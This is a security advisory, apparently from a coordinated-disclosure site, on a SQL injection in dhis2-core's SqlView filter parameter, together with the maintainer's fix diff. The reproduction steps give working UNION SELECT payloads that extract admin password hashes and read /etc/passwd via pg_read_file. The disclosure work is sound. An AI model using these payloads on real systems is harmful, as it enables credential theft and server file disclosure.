<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-FW0V6SAJ -->

# ANT-2026-FW0V6SAJ · dhis2/dhis2-core

## sql-injection high

[CVE-2026-55084](https://nvd.nist.gov/vuln/detail/CVE-2026-55084)
[GHSA-pwmg-mvjw-4m23](https://github.com/dhis2/dhis2-core/security/advisories/GHSA-pwmg-mvjw-4m23)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ophion Security.

# ANT-2026-FW0V6SAJ: SQL Injection via Unquoted Column Name in SqlView Filter Parameter

The /api/sqlViews/{uid}/data endpoint accepts a filter parameter of the form columnName:operator:value. In DefaultSqlViewService.getFilterQuery(), the columnName portion is concatenated raw into the SQL string, while only the operator's value is parameterized. Existing sanitization (ILLEGAL\_KEYWORDS, QUERY\_NAME\_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as userinfo and returning the results in the Grid response.

**Project:** [dhis2/dhis2-core](https://github.com/dhis2/dhis2-core)
**Commit:** `5c98fe9d15b8033f`
**Version:** master @ 661c44651367 (as of 2026-04-17)
**Location:** `DefaultSqlViewService.java:262`

getFilterQuery() builds the clause as `filter += sqlHelper.whereAnd() + " " + columnName + " " + operatorWithPlaceholder`, where columnName is split[0] taken directly from the user-supplied filter parameter with no regex check, allowlist, or quoting. The resulting string is passed to jdbcTemplate.queryForRowSet(sql, args) in HibernateSqlViewStore.populateSqlViewGrid(), so attacker-controlled SQL executes verbatim.

1. Identify any SqlView {uid} the user can read.
2. Send GET /api/sqlViews/{uid}/data?filter=1%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--:eq:x
3. The column name '1=1 UNION SELECT username,password FROM userinfo--' is concatenated into the WHERE clause; '--' comments out the remainder of the generated SQL.
4. Read the injected userinfo rows from the returned Grid response.

## Suggested Fix

Apply SqlUtils.quote() to the column name in getFilterQuery(), consistent with getCriteriaSqlClause() and parseSelectFields(), or validate the column name against the actual columns of the SQL view's result set before building the query.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-FW0V6SAJ.

---

**Reference:** ANT-2026-FW0V6SAJ

Triage and disclosure were performed by Ophion Security. The writeup below is the document the firm sent to the maintainer.

# [dhis2-core] - SQL Injection via Unquoted Column Name in SqlView Filter Parameter

**Product:DHIS2-Core**
**Affected versions:2.44-SNAPSHOT**
**Tested on:2.44-SNAPSHOT**

Severity: High

CVSS3.1: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`

## CVSS Reasoning

| Category | Value | Response |
| --- | --- | --- |
| Attack Vector | Network | Dashboard is accessed remotely via the application's web interface. |
| Attack Complexity | High | Exploitation depends on the target deployment having at least one SQL-view dashboard configured — a target-specific condition outside the attacker's control. A low-privilege user on a deployment without configured dashboards cannot exploit this, and the attacker cannot force one into existence. |
| Privilege Required | Low | Attacker needs an authenticated low-tier account with access to at least one existing dashboard. Higher-privileged users (owners/admins) have legitimate direct query access and do not need this vulnerability. |
| User Interaction | None | Attacker executes the injection directly; no other user needs to be involved. |
| Scope | Changed | `pg_read_file()` succeeded during testing, demonstrating the database role has `pg_read_server_files` privileges. This permits reading files outside the application's authorization boundary (host filesystem, system config, secrets), crossing a security authority boundary. RCE was not achieved, suggesting the role lacks superuser status, `pg_execute_server_program`, and untrusted PL access — but the file-read primitive alone justifies Scope:Changed. |
| Confidentiality | High | Arbitrary file read on the DB host via `pg_read_file()`, plus full read access to the database contents. |
| Integrity | High | SQL injection allows arbitrary modification of any data the DB role can write. |
| Availability | High | Attacker can drop tables, exhaust resources, or otherwise disrupt the database. |

## Summary

A SQL injection vulnerability exists in the `/api/sqlViews` endpoint of DHIS2 caused by improper sanitization of the `filter` input parameter. Any authenticated user with access to at least one SQL View dashboard can exploit this to execute arbitrary SQL queries, enabling lateral access to other database tables and local file read on the underlying server.

## Impact

Access to other tables within the database include `userinfo` and local file read through `pg_read_file`.

In the Docker deployment where this was tested, both table access and file read was confirmed.

## Description

The `/api/sqlViews/{uid}/data` endpoint accepts a `filter` parameter of the form `columnName:operator:value`. In `DefaultSqlViewService.getFilterQuery()`, the `columnName` portion is concatenated raw into the SQL string, while only the operator's value is parameterized. Existing sanitization (ILLEGAL\_KEYWORDS, QUERY\_NAME\_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as `userinfo`.

Additionally, the default deployment allows database user to execute as super user allowing for local file read such as `/etc/passwd` file.

1. Deploy the Docker config for DHIS2 following the GitHub repository setup.
2. Create a low privileged guest user account with `Guest` privilege with the following authorities set.

```
  "name": "Guest",
  "authorities": [
    "M_dhis-web-interpretation",
    "M_dhis-web-pivot",
    "M_dhis-web-mobile",
    "M_dhis-web-data-visualizer",
    "M_dhis-web-dashboard",
    "M_dhis-web-light",
    "M_dhis-web-messaging",
    "M_dhis-web-mapping",
    "M_dhis-web-visualizer",
    "M_dhis-web-maps"
  "access": {
    "manage": true,
    "write": true,
    "read": true,
    "update": true,
    "delete": true
  },
  "id": "XS0dNzuZmfH"
```

1. By default, the demo instance has a SQL View that can be used for testing. Retrieve the view UID through http://localhost:8080/api/sqlViews endpoint. Copy the UID value.
2. Send the following request to get a list of columns and data: `api/sqlViews/{UID}/data?var=valueType:STRING`
3. From the response, count the # of headers returned. These are the column counts that are needed. During testing, it was `27`.
4. Send the following request: `http://localhost:8080/api/sqlViews/{UID}/data?var=valueType:STRING&filter=1%3d1+UNION+SELECT+1,(SELECT+pg_read_file('/etc/passwd',100,100)),(SELECT+password+FROM+userinfo+WHERE+username='admin'),+(SELECT+email+FROM+userinfo+WHERE+username='admin'),NULL,NULL,NULL,NULL,NULL,NULL,+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,+NULL,CAST(NULL+AS+jsonb),NULL,CAST(NULL+AS+jsonb),+CAST(NULL+AS+jsonb),CAST(NULL+AS+jsonb),CAST(NULL+AS+jsonb)+WHERE+'a':neq:x`
5. If you get `ERROR: each UNION query must have the same number of columns\n Position: 100`, add or remove `NULL` till you get a successful output.
6. Successful output will include:
7. Content of /etc/passwd
8. Password hash of admin user
9. Email of admin user

## Remediation

Apply SqlUtils.quote() to the column name in getFilterQuery(), consistent with getCriteriaSqlClause() and parseSelectFields(), or validate the column name against the actual columns of the SQL view's result set before building the query.

-> CVD Recommendation: Report

-> Anthropic discussion:

The change that resolved this finding.

```
diff --git a/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java b/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java
index 790b303435ed..aa0c63a80408 100644
--- a/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java
+++ b/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java
@@ -259,7 +259,7 @@ private OperatorWithPlaceHolderAndArg getFilterQuery(
     filter +=
         sqlHelper.whereAnd()
             + " "
-            + columnName
+            + SqlUtils.quote(columnName)
             + " "
             + operatorWithPlaceHolderAndArg.operatorWithPlaceholder();

diff --git a/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java b/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java
index 23bcfc63aed6..9bc63992b3c9 100644
--- a/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java
+++ b/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java
@@ -34,6 +34,8 @@
 import jakarta.persistence.EntityManager;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.io.InvalidClassException;
+import java.io.ObjectInputFilter;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
@@ -56,6 +58,16 @@
 public class HibernateUserSettingStore extends HibernateNativeStore<UserSetting>
     implements UserSettingStore {

+  private static final ObjectInputFilter DESERIALIZATION_FILTER =
+      ObjectInputFilter.Config.createFilter(
+          "maxdepth=5;maxrefs=20;maxarray=0;maxbytes=65536;"
+              + "java.lang.String;java.lang.Boolean;"
+              + "java.lang.Number;java.lang.Integer;java.lang.Long;"
+              + "java.lang.Double;java.lang.Float;java.lang.Enum;"
+              + "java.util.Locale;java.util.Date;"
+              + "org.hisp.dhis.common.Locale;org.hisp.dhis.common.DisplayProperty;"
+              + "!*");
+
   public HibernateUserSettingStore(EntityManager em) {
     super(em, UserSetting.class);
@@ -121,30 +133,34 @@ public void deleteAll(@Nonnull String username) {

   /**
-   * ATM values are stored as binary data serialized from {@link java.io.Serializable}. As we are
-   * only dealing with primitive values they all implement {@link Object#toString()} in a way that
-   * yields the proper {@link String} form. This is the 1st step in away from storing binary data by
-   * only using strings outside the store layer. Also, once settings are updated they always are
-   * {@link String}s just still in their binary form.
+   * Deserializes a binary-stored user setting value to its String form. After V2_44_8 migration,
+   * all rows contain serialized Strings. The ObjectInputFilter remains as a safety net against
+   * unexpected types or tampered data.
    */
-  private static String fromBinary(String key, Object value) {
+  static String fromBinary(String key, Object value) {
     if (value == null) return "";
     if (value instanceof byte[] binary) {
       try {
         ByteArrayInputStream bis = new ByteArrayInputStream(binary);
         ObjectInputStream ois = new ObjectInputStream(bis);
+        ois.setObjectInputFilter(DESERIALIZATION_FILTER);
         return Settings.valueOf((Serializable) ois.readObject());
+      } catch (InvalidClassException ex) {
+        log.error(
+            "Deserialization filter rejected class for user setting '{}': {}",
+            key,
+            ex.getMessage());
+        return "";
       } catch (Exception ex) {
-        log.warn(
-            "Failed to de-serialize user setting %s from binary representation, using default"
-                .formatted(key));
+        log.warn("Failed to de-serialize user setting '{}' from binary, using default", key);
         return "";
     if (value instanceof Serializable s) return Settings.valueOf(s);
     log.warn(
-        "Failed to de-serialize user setting %s from unknown source type: %s, using default"
-            .formatted(key, value.getClass()));
+        "Failed to de-serialize user setting '{}' from unknown source type: {}, using default",
+        key,
+        value.getClass());
     return "";

diff --git a/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java b/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java
new file mode 100644
index 000000000000..ea0cdaf4e05c
--- /dev/null
+++ b/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java
@@ -0,0 +1,103 @@
+/*
+ * Copyright (c) 2004-2026, University of Oslo
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, this
+ * list of conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice,
+ * this list of conditions and the following disclaimer in the documentation
+ * and/or other materials provided with the distribution.
+ *
+ * 3. Neither the name of the copyright holder nor the names of its contributors
+ * may be used to endorse or promote products derived from this software without
+ * specific prior written permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+ * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+ * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+ * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+ * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
+ * ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+ * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+package org.hisp.dhis.user.hibernate;
+
+import static org.junit.jupiter.api.Assertions.assertEquals;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+import java.util.Date;
+import java.util.Locale;
+import java.util.stream.Stream;
+import javax.management.BadAttributeValueExpException;
+import org.hisp.dhis.common.DisplayProperty;
+import org.junit.jupiter.api.Test;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.Arguments;
+import org.junit.jupiter.params.provider.MethodSource;
+
+/**
+ * Verifies the {@link java.io.ObjectInputFilter} on {@link
+ * HibernateUserSettingStore#fromBinary(String, Object)} accepts known safe types and rejects
+ * potential gadget classes.
+ *
+ * @author Morten Svanaes
+ */
+class HibernateUserSettingStoreFilterTest {
+
+  static Stream<Arguments> allowedTypes() {
+    return Stream.of(
+        Arguments.of("String value", "hello", "hello"),
+        Arguments.of("Boolean value", Boolean.TRUE, "true"),
+        Arguments.of("Integer value", 42, "42"),
+        Arguments.of("Long value", 100L, "100"),
+        Arguments.of("Double value", 3.14, "3.14"),
+        Arguments.of("java.util.Locale", Locale.FRENCH, "fr"),
+        Arguments.of("java.util.Date", new Date(1700000000000L), "1700000000000"),
+        Arguments.of("DHIS2 Locale", org.hisp.dhis.common.Locale.FRENCH, "fr"),
+        Arguments.of("DisplayProperty enum", DisplayProperty.NAME, "NAME"));
+  }
+
+  @Param
… (truncated)
```

<https://github.com/dhis2/dhis2-core/commit/16cbb390a21391cc5f948092f06a52ce69a3274f>

1. 2026-04-16
2. 2026-05-04
3. 2026-05-07
4. 2026-06-09
5. 2026-08-17

68ded1ff1ee7e9e30fd004f1ec1bc8aeafe4c6d0dc6f40776fa19d937fbb76645beff98c9faa848cdeac10cb56957abd740b6f68d3b7846d3c5c9cf93c40babb

Committed 2026-05-07 07:08 UTC

Revealed 2026-08-17 17:47 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-FW0V6SAJ%22%2C%22bug_class%22%3A%22SQL%20Injection%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%225c98fe9d15b8033f%22%2C%22created_at%22%3A%222026-04-17T05%3A20%3A48%2B00%3A00%22%2C%22description%22%3A%22The%20/api/sqlViews/%7Buid%7D/data%20endpoint%20accepts%20a%20filter%20parameter%20of%20the%20form%20columnName%3Aoperator%3Avalue.%20In%20DefaultSqlViewService.getFilterQuery%28%29%2C%20the%20columnName%20portion%20is%20concatenated%20raw%20into%20the%20SQL%20string%2C%20while%20only%20the%20operator%27s%20value%20is%20parameterized.%20Existing%20sanitization%20%28ILLEGAL_KEYWORDS%2C%20QUERY_NAME_REGEX%2C%20SqlUtils.quote%28%29%29%20covers%20stored%20query%20text%2C%20criteria%20keys%2C%20and%20select%20fields%2C%20but%20not%20the%20runtime%20filter%20column%20name.%20An%20authenticated%20user%20with%20read%20access%20to%20any%20SqlView%20can%20therefore%20inject%20arbitrary%20SQL%2C%20e.g.%20a%20UNION%20SELECT%2C%20into%20the%20query%20executed%20by%20jdbcTemplate.queryForRowSet%28%29.%20This%20allows%20reading%20arbitrary%20tables%20such%20as%20userinfo%20and%20returning%20the%20results%20in%20the%20Grid%20response.%22%2C%22discovered_at%22%3A%222026-04-16T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22DefaultSqlViewService.java%3A262%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22dhis2-core%22%2C%22reproduction%22%3A%5B%221.%20Identify%20any%20SqlView%20%7Buid%7D%20the%20user%20can%20read.%22%2C%222.%20Send%20GET%20/api/sqlViews/%7Buid%7D/data%3Ffilter%3D1%253D1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520userinfo--%3Aeq%3Ax%22%2C%223.%20The%20column%20name%20%271%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--%27%20is%20concatenated%20into%20the%20WHERE%20clause%3B%20%27--%27%20comments%20out%20the%20remainder%20of%20the%20generated%20SQL.%22%2C%224.%20Read%20the%20injected%20userinfo%20rows%20from%20the%20returned%20Grid%20response.%22%5D%2C%22technical_details%22%3A%22getFilterQuery%28%29%20builds%20the%20clause%20as%20%60filter%20%2B%3D%20sqlHelper.whereAnd%28%29%20%2B%20%5C%22%20%5C%22%20%2B%20columnName%20%2B%20%5C%22%20%5C%22%20%2B%20operatorWithPlaceholder%60%2C%20where%20columnName%20is%20split%5B0%5D%20taken%20directly%20from%20the%20user-supplied%20filter%20parameter%20with%20no%20regex%20check%2C%20allowlist%2C%20or%20quoting.%20The%20resulting%20string%20is%20passed%20to%20jdbcTemplate.queryForRowSet%28sql%2C%20args%29%20in%20HibernateSqlViewStore.populateSqlViewGrid%28%29%2C%20so%20attacker-controlled%20SQL%20executes%20verbatim.%22%2C%22title%22%3A%22SQL%20Injection%20via%20Unquoted%20Column%20Name%20in%20SqlView%20Filter%20Parameter%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-FW0V6SAJ",
  "bug_class": "SQL Injection",
  "commit_sha": "5c98fe9d15b8033f",
  "created_at": "2026-04-17T05:20:48+00:00",
  "description": "The /api/sqlViews/{uid}/data endpoint accepts a filter parameter of the form columnName:operator:value. In DefaultSqlViewService.getFilterQuery(), the columnName portion is concatenated raw into the SQL string, while only the operator's value is parameterized. Existing sanitization (ILLEGAL_KEYWORDS, QUERY_NAME_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as userinfo and returning the results in the Grid response.",
  "discovered_at": "2026-04-16T00:00:00+00:00",
  "location": "DefaultSqlViewService.java:262",
  "project": "dhis2-core",
    "1. Identify any SqlView {uid} the user can read.",
    "2. Send GET /api/sqlViews/{uid}/data?filter=1%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--:eq:x",
    "3. The column name '1=1 UNION SELECT username,password FROM userinfo--' is concatenated into the WHERE clause; '--' comments out the remainder of the generated SQL.",
    "4. Read the injected userinfo rows from the returned Grid response."
  "technical_details": "getFilterQuery() builds the clause as `filter += sqlHelper.whereAnd() + \" \" + columnName + \" \" + operatorWithPlaceholder`, where columnName is split[0] taken directly from the user-supplied filter parameter with no regex check, allowlist, or quoting. The resulting string is passed to jdbcTemplate.queryForRowSet(sql, args) in HibernateSqlViewStore.populateSqlViewGrid(), so attacker-controlled SQL executes verbatim.",
  "title": "SQL Injection via Unquoted Column Name in SqlView Filter Parameter",
```
